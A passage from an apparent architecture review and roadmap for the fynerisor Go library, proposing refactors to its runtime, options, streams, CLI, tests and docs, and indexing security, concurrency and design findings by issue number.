A typical widget file shrinks from 150–300 lines to 40–100. Factories (`widget`, `container`, `canvas`, `dialog`, `chart`, `fyne`, `binding`) use the same registry, which removes the 780-line `switch` in `gui/widget.go`.

- **Effort:** L but mechanical, one file per PR. **Risk:** L. **Payoff:** an estimated 4–6k fewer lines, consistent errors ([E1](#e1)), and generated docs ([DOC2](#doc2)).

<a id="r4-io-writer"></a>
### R4 — Output and input as streams → [#24](https://github.com/uidbz/fynerisor/issues/24), [#42](https://github.com/uidbz/fynerisor/issues/42)

```go
func WithStdin(r io.Reader) Option
func WithStdout(w io.Writer) Option
func WithStderr(w io.Writer) Option
// print → rt.stdout; library errors → rt.onError → rt.stderr
// widget.Log implements io.Writer (line-buffered; appends via guithread.Do)
// window.CaptureStdout(log)  ==  rt.SetStdout(io.MultiWriter(rt.Stdout(), log))
```

The `os.Pipe` hijack, its two goroutines, the legacy closure form and the `stdoutSink` special case all disappear. The `exec` module can then accept `stdout: log` directly.

<a id="r5"></a>
### R5 — Typed lifecycle → [#39](https://github.com/uidbz/fynerisor/issues/39)

```go
type RunState int  // Idle, Running, Ready, Failed, Stopped
func (w *Window) Start(ctx context.Context) <-chan error  // async, like Execute today
func (w *Window) Run(ctx context.Context) error           // sync
func (w *Window) Stop()
func (w *Window) State() (RunState, error)
WithOnStateChange(func(RunState, error))
```

This replaces string matching on `"ERROR: "` and `"Ready!"` in the CLI and browser, which a script can spoof with `window.SetStatus`. It also replaces the racy exported `Status` field. `WithStatusCallback` stays, but only for the human-readable text a script sets.

<a id="r6"></a>
### R6 — Option model and capabilities → [#40](https://github.com/uidbz/fynerisor/issues/40)

```go
type Option func(*config)                         // one pass, in order
func Module(name string, v any) Option            // generic; WithHTTP() == Module("http", http.Module())
func Safe() Option                                // strings, filepath, time, json, csv
func Files(readOnly bool) Option                  // io read (+ write)
func Exec() Option
func Network() Option                             // http (+ httpimport, if allowed)
func Full() Option                                // today's CLI set
```

- Removes the type-switch classification in `newWindow` (`gui/window.go:164-171,211-215`).
- Every `WithX` collapses to one line.
- The host chooses policy (CLI `--modules=…`, browser per origin); the library provides only mechanism.
- `gui/db.WithSQL()` keeps cgo SQL drivers out of GUI binaries that don't need them.

<a id="r7"></a>
### R7 — Parser-based analysis → [#23](https://github.com/uidbz/fynerisor/issues/23)

See [B6](#b6). Once requirements come from the AST, `fynerisor analyze --json` and an accurate `RequiresGUI()` for the CLI's headless choice follow ([U3](#u3)).

---

## 7. Simplification options (ranked)

Ranked by *complexity removed per unit of risk*. LOC figures are estimates.

| Rank | Simplification | Removes | Est. LOC | Risk | Issue |
|---|---|---|---|---|---|
| 1 | Delete dead code: `Cost`, no-op `MarshalJSON`, deprecated stubs, unused loaders, duplicate interfaces | noise in every file | −700 | Low | [#33](https://github.com/uidbz/fynerisor/issues/33) |
| 2 | Delete the CLI import loop; build CLI options once | a latent fatal error, duplicated lists | −40 | Low | [#22](https://github.com/uidbz/fynerisor/issues/22), [#29](https://github.com/uidbz/fynerisor/issues/29) |
| 3 | `print` writes to an `io.Writer`; `Log` is an `io.Writer` | pipe hijack, 2 goroutines per capture, legacy closure path | −80 | Low | [#24](https://github.com/uidbz/fynerisor/issues/24) |
| 4 | Share core's loader/require/import/runner with gui | four duplicated files | −500 | Low–Med | [#32](https://github.com/uidbz/fynerisor/issues/32) |
| 5 | Generic `Module(name, v)` option; options as `func(*config)` | 25 eight-line closures, the type switch in `newWindow` | −300 | Low | [#40](https://github.com/uidbz/fynerisor/issues/40) |
| 6 | One `rt.Callback` helper + per-runtime executor | `functionCalls`, loop goroutine, `Window.Do`, global vmguard, ~65 `GetCallFunc` blocks | −600 | Med | [#37](https://github.com/uidbz/fynerisor/issues/37) |
| 7 | Embedded `base` type + `AttrRegistry` for wrappers and factories | per-type boilerplate, arity checks, giant switches | −4000…−6000 | Low (mechanical) | [#38](https://github.com/uidbz/fynerisor/issues/38) |
| 8 | Shared http option parsing; Risor's type conversion | 5× option parsing, 2× converters | −250 | Low | [#25](https://github.com/uidbz/fynerisor/issues/25), [#34](https://github.com/uidbz/fynerisor/issues/34) |
| 9 | Orthogonal modules (`io` streams; `json`/`csv` pure) | overlapping `os.read_file`/`io.read_all`/`json.read`/…, `os.exec` | −150 (after deprecation) | Med (API) | [#41](https://github.com/uidbz/fynerisor/issues/41) |
| 10 | Generated API reference | ~2–3k lines of hand-written reference across 5 files | docs only | Low | [#47](https://github.com/uidbz/fynerisor/issues/47) |

Other, smaller simplifications:

- **`browser.navigate` / `showAuthDialog`** share one `loadPage(url, content)` function (#28).
- **`Window.Resize` builtin** wraps `guithread.Do(w.Resize)`, and `Resize` itself calls `guithread.Do` again in embedded mode. Call it directly.
- **`App` object** (`gui/app_object.go`) stores a copy of `appName` and also a pointer to the window. Keep one.
- **`core/version.go` `GetVersion().RisorCompat` / `FyneCompat`** are hard-coded strings that drift from `go.mod`. Read them via `debug.ReadBuildInfo()` or drop them.
- **`EvalBatch`** builds `templateEnv` and per-worker `env` maps by hand. With R1 this becomes `rt.Clone().SetGlobals(input)`.

---

## 8. Unix philosophy assessment

> Write programs that do one thing and do it well. Write programs to work together. Write programs to handle text streams, because that is a universal interface.
>
> …the power of a system comes more from the relationships among programs than from the programs themselves.

fynerisor is a library and a GUI toolkit, not a set of shell tools, so the principles apply by analogy. **Programs** map to packages, types and modules. **Pipes** map to `io.Reader`/`io.Writer`, and to values passed between script functions. **The shell** maps to the Risor script that composes those parts, and to the CLI that composes fynerisor with other programs.

### 8.1 What already fits well

- **`core` without GUI dependencies** is a clean "do one thing" split, and `core/db` keeping SQL drivers opt-in is the same idea applied again.
- **`core.EvalBatch`** is a good Unix-style design: compile once, run many isolated workers, results aligned with inputs, per-input errors. It is small, composable and explicit.
- **The `exec` module** already supports `stdin`/`stdout`/`stderr` options with `io.Reader`/`io.Writer`, so it is pipe-friendly.
- **`csv.parse` / `csv.format` and `json.parse` / `json.marshal`** are pure text transforms.
- **The CLI reads scripts from stdin (`-`)** and passes trailing arguments through.
- **`CompileScript` / `Compile`** (issue #6) is a "check" primitive that can be composed into CI.

### 8.2 Do one thing well

| Component | Things it does today | Suggested split | Issue |
|---|---|---|---|
| `gui.Window` | runtime, module registry, import cache, Fyne host adapter, stdout capture, callback scheduler, shortcuts, drop handler, and also the `window` script object | `core.Runtime` (engine) + `gui.Host` (Fyne window adapter) + `window` object (script API) | [#32](https://github.com/uidbz/fynerisor/issues/32), [#37](https://github.com/uidbz/fynerisor/issues/37) |
| `modules/os` | environment info, file read, file write/delete, directory ops, process spawn | `os` = environment and filesystem metadata; files → `io`; processes → `exec` | [#41](https://github.com/uidbz/fynerisor/issues/41) |
| `json.read/write`, `csv.read/write` | file I/O **and** format conversion | formats do conversion only; `io` does I/O | [#41](https://github.com/uidbz/fynerisor/issues/41) |
| `cmd/fynerisor` | GUI launcher, headless test runner, watcher, analyzer, globals loader | subcommands `run`, `check`, `analyze`, `docs`; `--watch` as a run flag | [#43](https://github.com/uidbz/fynerisor/issues/43) |
| `browser.Browser` | navigation UI, HTTP loading, auth, history, and script execution policy | the browser does navigation; loading and policy are injected (it already takes `LoadContent`, but has no module/capability policy hook) | [#7](https://github.com/uidbz/fynerisor/issues/7), [#28](https://github.com/uidbz/fynerisor/issues/28) |
| `gui/widget.go` `Widget` factory | 780-line `switch` constructing 40+ widgets and wiring callbacks | one registry entry per widget, in the widget's own file | [#38](https://github.com/uidbz/fynerisor/issues/38) |

### 8.3 Work together (composition and relationships)

The key test is whether parts can be **combined in ways their authors did not foresee**. Today several design choices prevent that:

1. **Global state stops two runtimes from coexisting** ([#44](https://github.com/uidbz/fynerisor/issues/44)). `os.SetScriptArgs`, `core.SetAppVersion`, `os.Stdout`, the vmguard owner and the guithread main ID are process globals. Two embedded `CanvasObject`s, or a GUI next to a headless `EvalBatch`, interfere with each other. A component with hidden global inputs cannot be composed.
2. **`gui.Option` ≠ `core.Option`** ([#32](https://github.com/uidbz/fynerisor/issues/32)). A host can't define "my module set" once and hand it to both a headless runner and a window.
3. **Overlapping functions instead of composable primitives** ([#41](https://github.com/uidbz/fynerisor/issues/41)). There are four ways to read a file and two ways to copy or execute, but no way to parse CSV from stdin or from an HTTP body without detours. With `io` moving bytes and `json`/`csv` transforming text, every source can be combined with every format:
   ```risor
   let rows = csv.parse(exec(["psql", "-c", q, "--csv"]).stdout)
   io.write(io.stdout, json.format(rows))
   ```
4. **Components talk through stringly-typed side channels** ([#39](https://github.com/uidbz/fynerisor/issues/39)). The CLI and browser parse `"ERROR: …"` / `"Ready!"` from a status string that scripts can also write. Inside a process the relationship should be typed (`error`, `State`). Text belongs at the process boundary.
5. **Separation of policy and mechanism** ([#40](https://github.com/uidbz/fynerisor/issues/40), [#7](https://github.com/uidbz/fynerisor/issues/7)). The library hard-codes capability bundles (`WithOS` = everything), and the browser hard-codes a module list. The mechanism should be fine-grained capabilities, with policy in the host (flags, origins).
6. **Callbacks with four disciplines** ([#37](https://github.com/uidbz/fynerisor/issues/37)). A widget author can't treat a script function as "just a callable", because each widget must know which thread and guard to use. A single `rt.Callback` makes the relationship between widgets and the VM uniform. Then any widget can be composed with any script function.
7. **Imports resolve against the CWD** ([#8](https://github.com/uidbz/fynerisor/issues/8)). A module's meaning depends on where the *process* was started, not on where the module lives, so scripts can't be moved or combined reliably.

### 8.4 Text streams

| Gap | Effect | Proposal | Issue |
|---|---|---|---|
| `print` goes to a hijacked process-wide `os.Stdout` | capture is global and fragile; host output is swallowed | per-runtime `stdout` writer; `Log` is an `io.Writer` | [#24](https://github.com/uidbz/fynerisor/issues/24) |
| Library errors on stdout | pipelines corrupted; errors appear in user logs | errors → stderr / handler | [#31](https://github.com/uidbz/fynerisor/issues/31) |
| No `stdin` / `stderr` for scripts | a fynerisor script can't be a filter | `io.stdin`, `io.stdout`, `io.stderr`; `print`/`eprint` | [#42](https://github.com/uidbz/fynerisor/issues/42) |
| CLI reads the script from stdin, leaving no stdin for data | `cat data | fynerisor app.risor` impossible | when a file is given, stdin is the script's; `-e 'code'` for inline code | [#42](https://github.com/uidbz/fynerisor/issues/42) |
| CLI diagnostics are `log.Printf` with timestamps; exit status 1 only for setup failures | hard to consume from editors, CI, `grep` | `file:line:col: message` on stderr; exit 0/1/2; `--json` output | [#43](https://github.com/uidbz/fynerisor/issues/43) |
| `http` response bodies forced to `string` | binary content mangled; can't stream | `body` as bytes plus `text()`/`json()`; optional streaming reader | [#25](https://github.com/uidbz/fynerisor/issues/25) |

### 8.5 Raymond's rules that apply directly

| Rule | Where it's violated | Issue |
|---|---|---|
| **Modularity:** simple parts, clean interfaces | `Window` god object; four VM entry paths | #32, #37 |
| **Composition:** design programs to be connected | global state, incompatible option types, overlapping modules | #44, #32, #41 |
| **Separation:** policy from mechanism | browser module list, all-or-nothing `WithOS` | #7, #40 |
| **Silence:** say nothing when there's nothing to say | library prints to stdout | #31 |
| **Repair:** fail noisily and as soon as possible | error values instead of raised errors; HTTP 404 → empty module; `Clipboard.Read` → `""`; `AnalyzeRequirements` never errors | #30, #19, #18, #23 |
| **Least surprise** | `NewAccordionItem` ignores an argument; `NewCalendar` silently defaults; `Stop()` doesn't stop | #36, #9 |
| **Parsimony / Economy** | ~4–6k lines of boilerplate; dead code | #38, #33 |
| **Generation:** write programs that write programs | hand-maintained API reference in five places, while `Attrs()` returns `nil` | #47 |
| **Robustness / Transparency** | concurrency hazards are invisible until they corrupt the VM | #37, #45 |

### 8.6 Unix-philosophy work items

<a id="u1"></a>
- **U1 — Orthogonal modules** · [#41](https://github.com/uidbz/fynerisor/issues/41). `io` moves bytes and text (`read`, `write`, `copy`, `lines`, `stdin`, `stdout`, `stderr`); `json`/`csv` only `parse`/`format`; `os` covers environment and filesystem metadata; `exec` runs processes. Deprecate overlaps for one release, then remove.

<a id="u2"></a>
- **U2 — Standard streams for scripts** · [#42](https://github.com/uidbz/fynerisor/issues/42). Example target:
  ```sh
  cat data.csv | fynerisor -e 'print(json.format(csv.parse(io.stdin.read())))' | jq '.[0]'
  ```

<a id="u3"></a>
- **U3 — The CLI as small tools** · [#43](https://github.com/uidbz/fynerisor/issues/43).
  ```
  fynerisor run   [--modules=safe|full|a,b] [--timeout=30s] [--json] script.risor [args…]
  fynerisor check script.risor…        # compile only; file:line:col: msg; exit 1 on error
  fynerisor analyze [--json] script…   # requirements and imports (parser-based, #23)
  fynerisor docs [--json|--markdown]   # API reference from Attrs() (#38, #47)
  ```
  `run` uses the headless `core` path when the script doesn't `require("@gui")`.

<a id="u4"></a>
- **U4 — No process-global state** · [#44](https://github.com/uidbz/fynerisor/issues/44). Script args, app version, streams, executor and main-goroutine detection all become per-runtime configuration.

---

<a id="t1"></a>
## 9. Testing

Tracked in [#45](https://github.com/uidbz/fynerisor/issues/45).

**Current state.** 35 test files. `core`, `gui`, `gui/chart`, `gui/guithread`, `gui/vmguard`, `gui/widget/tablewidget`, `modules/{csv,exec,json,os,tie}` have tests and pass. `-race` fails in `gui` ([#15](https://github.com/uidbz/fynerisor/issues/15)).

**Packages with no tests:** `browser`, `cmd/*`, `core/db`, `gui/widget` (covered only partly via `gui` integration tests), `gui/binding`, `gui/canvas`, `gui/container`, `gui/dialog`, `modules/{http,io,sql,strings,filepath,time}`.

**Proposals**

1. **CI** (GitHub Actions on Linux; install Fyne's usual cgo build dependencies — GL and X11 headers. The tests use `fyne.io/fyne/v2/test`, so no display is needed):
   - `go vet ./...`
   - `go test -race ./...`
   - `go build ./examples/...`
   - later, `fynerisor check examples/*/*.risor`
2. **Regression tests.** Each review issue lists acceptance criteria. Notable ones:
   - Tap a button 100× after a script error ([#10](https://github.com/uidbz/fynerisor/issues/10)).
   - Stop an infinite loop within 1 s ([#9](https://github.com/uidbz/fynerisor/issues/9)).
   - Type 200 characters with `OnChanged` under `-race` ([#11](https://github.com/uidbz/fynerisor/issues/11)).
   - `clipboard.Copy` / `Read` round-trip from the main body ([#18](https://github.com/uidbz/fynerisor/issues/18)).
   - `httptest` 404 import must fail ([#19](https://github.com/uidbz/fynerisor/issues/19)).
   - Multi-line `require` analysis ([#23](https://github.com/uidbz/fynerisor/issues/23)).
   - Two `CanvasObject`s capturing their own output ([#24](https://github.com/uidbz/fynerisor/issues/24)).
3. **Module tests:** `httptest.Server` for `http` and URL imports, `sqlite::memory:` for `sql`, temp-dir tests for `io`.
4. **Leak checks:** `go.uber.org/goleak` around Execute/Stop.
5. **Architecture guards:** a test that greps `gui/widget` for raw `callFunc(` and for `go func()` near VM calls ([#12](https://github.com/uidbz/fynerisor/issues/12)), plus a test that every registered attribute appears in `Attrs()` ([#38](https://github.com/uidbz/fynerisor/issues/38)).

---

## 10. Documentation

<a id="doc1"></a>
### DOC1 — Stale documents · [#46](https://github.com/uidbz/fynerisor/issues/46)

- `docs/CONCURRENCY.md:207-239` describes vmguard as a `TryLock` mutex. The code is a reentrant owner guard. The doc also says "All other widgets — audited and safe", which [#11](https://github.com/uidbz/fynerisor/issues/11) disproves.
- `docs/IMPROVEMENTS.md` is the pre-extraction plan: `NewScriptWindow`, `ImportScript` presented as a feature, "thread-safe design". Mark it historical and point to this document.
- `CLAUDE.md` "Callback pattern" (`w.functionCalls <- func(){ fyne.Do(…) }`) doesn't match the code. Update it after R2.

<a id="doc2"></a>
### DOC2 — One source of truth · [#47](https://github.com/uidbz/fynerisor/issues/47)

The API is described by hand in `README.md` (572 lines), `docs/README.md` (1242), `llms.txt` (1473), `doc.go` (292) and `docs/EXAMPLES.md` (1010), and the version string is bumped in 6+ places. Once [R3](#r3) populates `Attrs()`:

- `fynerisor docs --markdown` generates `docs/API.md` and the reference part of `llms.txt`.
- CI checks for drift with `go generate ./... && git diff --exit-code`.
- `README.md` becomes an overview with links.

---

## 11. Roadmap

The live checklist is the pinned tracker **[#48](https://github.com/uidbz/fynerisor/issues/48)**. ⚠️ marks breaking changes, which need `BREAKING CHANGE:` in the commit and a CHANGELOG "Unreleased" entry, per CLAUDE.md.

| Phase | Goal | Items | Depends on |
|---|---|---|---|
| **0 — Security** | close the remote-code hole | #7 (drop `WithOS` from browser now), #8 ⚠️ | — |
| **1 — Quick fixes** | small local fixes, `-race` green | #22, #19, #18, #20, #21, #9, #10 (short-term), #11, #15, #36 | — |
| **2 — Concurrency model** | one way into the VM | #37 (umbrella: #12, #13, #14, #16, #17 ⚠️), #39 ⚠️ | #9, #15 |
| **3 — One runtime** | compose, don't copy | #32 (umbrella: #27, #25, #23), #40 ⚠️, #44 ⚠️, #24 ⚠️ | Phase 2 |
| **4 — Errors and boilerplate** | consistent and smaller | #30 ⚠️, #31, #38, #33 ⚠️, #34, #35 | #32 for #31; none for #38 |
| **5 — Modules and CLI as tools** | composable at the edges | #41 ⚠️ (deprecate first), #42, #43, #29, #26, #28 | #24, #40 |
| **6 — Tests and docs** | keep it that way | #45 (start in Phase 1), #46, #47 | #37, #38 |

Suggested version line, assuming semver pre-1.0:

- **v0.9.x:** Phases 0–1 (patch releases; the only behaviour change is that the browser no longer enables `os`).
- **v0.10.0:** Phases 2–3 (lifecycle API, runtime, options; deprecations announced).
- **v0.11.0:** Phases 4–5 (module reshaping, CLI subcommands; deprecated APIs removed).

---

## 12. Appendix: finding index

| Key | Issue | Severity | Title |
|---|---|---|---|
| S1 | [#7](https://github.com/uidbz/fynerisor/issues/7) | Critical | Browser runs remote scripts with os + http |
| S2 | [#8](https://github.com/uidbz/fynerisor/issues/8) | High | import() resolves against CWD; remote → local imports |
| L1 | [#9](https://github.com/uidbz/fynerisor/issues/9) | High | Execute/Stop cannot cancel scripts |
| C1 | [#10](https://github.com/uidbz/fynerisor/issues/10) | High | UI freeze on the functionCalls channel |
| C2 | [#11](https://github.com/uidbz/fynerisor/issues/11) | High | OnChanged / binding listeners use raw goroutines |
| C3 | [#12](https://github.com/uidbz/fynerisor/issues/12) | High | ~29 unguarded direct callFunc sites |
| C4 | [#13](https://github.com/uidbz/fynerisor/issues/13) | Medium | vmguard is process-global |
| C5 | [#14](https://github.com/uidbz/fynerisor/issues/14) | Medium | guithread.SetMain re-recorded per window |
| C6 | [#15](https://github.com/uidbz/fynerisor/issues/15) | High | -race fails 16 gui tests |
| C7 | [#16](https://github.com/uidbz/fynerisor/issues/16) | Medium | Stale callbacks after re-Execute |
| C8 | [#17](https://github.com/uidbz/fynerisor/issues/17) | Medium | go() on a shared VM |
| B1 | [#18](https://github.com/uidbz/fynerisor/issues/18) | High | clipboard.Read returns "" off the UI thread |
| B2 | [#19](https://github.com/uidbz/fynerisor/issues/19) | High | GUI HTTP import swallows non-200 |
| B3 | [#20](https://github.com/uidbz/fynerisor/issues/20) | Medium | require("@") panic; wrong option hints |
| B4 | [#21](https://github.com/uidbz/fynerisor/issues/21) | Medium | NewForm list branch uses args[0] |
| B5 | [#22](https://github.com/uidbz/fynerisor/issues/22) | High | CLI calls removed ImportScript |
| B6 | [#23](https://github.com/uidbz/fynerisor/issues/23) | Medium | AnalyzeRequirements is line-based (incl. R7) |
| B7 | [#24](https://github.com/uidbz/fynerisor/issues/24) | High | CaptureStdout hijacks os.Stdout (incl. R4) |
| B8 | [#25](https://github.com/uidbz/fynerisor/issues/25) | Medium | HTTP ctx / client / import timeout |
| B9 | [#26](https://github.com/uidbz/fynerisor/issues/26) | Low | SQL ignores ctx |
| B10 | [#27](https://github.com/uidbz/fynerisor/issues/27) | Medium | Module compile/run env mismatch |
| B11 | [#28](https://github.com/uidbz/fynerisor/issues/28) | Medium | Browser auth / blocking navigation |
| B12 | [#29](https://github.com/uidbz/fynerisor/issues/29) | Medium | CLI headless / watch / options |
| E1 | [#30](https://github.com/uidbz/fynerisor/issues/30) | Medium | Error values vs raised errors |
| E2 | [#31](https://github.com/uidbz/fynerisor/issues/31) | Medium | Library diagnostics on stdout |
| D1 | [#32](https://github.com/uidbz/fynerisor/issues/32) | High | gui duplicates core (incl. R1) |
| D2 | [#33](https://github.com/uidbz/fynerisor/issues/33) | Low | Dead code |
| D3 | [#34](https://github.com/uidbz/fynerisor/issues/34) | Low | Duplicate JSON converters |
| D4 | [#35](https://github.com/uidbz/fynerisor/issues/35) | Low | Second clipboard stack |
| D5 | [#36](https://github.com/uidbz/fynerisor/issues/36) | Low | Small inconsistencies |
| R2 | [#37](https://github.com/uidbz/fynerisor/issues/37) | High | VM executor per runtime |
| R3 | [#38](https://github.com/uidbz/fynerisor/issues/38) | Medium | Wrapper boilerplate via AttrRegistry |
| R5 | [#39](https://github.com/uidbz/fynerisor/issues/39) | Medium | Typed lifecycle |
| R6 | [#40](https://github.com/uidbz/fynerisor/issues/40) | Medium | Option model and capabilities |
| U1 | [#41](https://github.com/uidbz/fynerisor/issues/41) | Medium | Orthogonal modules |
| U2 | [#42](https://github.com/uidbz/fynerisor/issues/42) | Medium | stdin/stdout/stderr for scripts |
| U3 | [#43](https://github.com/uidbz/fynerisor/issues/43) | Medium | CLI as small tools |
| U4 | [#44](https://github.com/uidbz/fynerisor/issues/44) | Medium | No process-global state |
| T1 | [#45](https://github.com/uidbz/fynerisor/issues/45) | Medium | CI with -race, regression tests |
| DOC1 | [#46](https://github.com/uidbz/fynerisor/issues/46) | Low | Stale docs |
| DOC2 | [#47](https://github.com/uidbz/fynerisor/issues/47) | Low | Generated API reference |
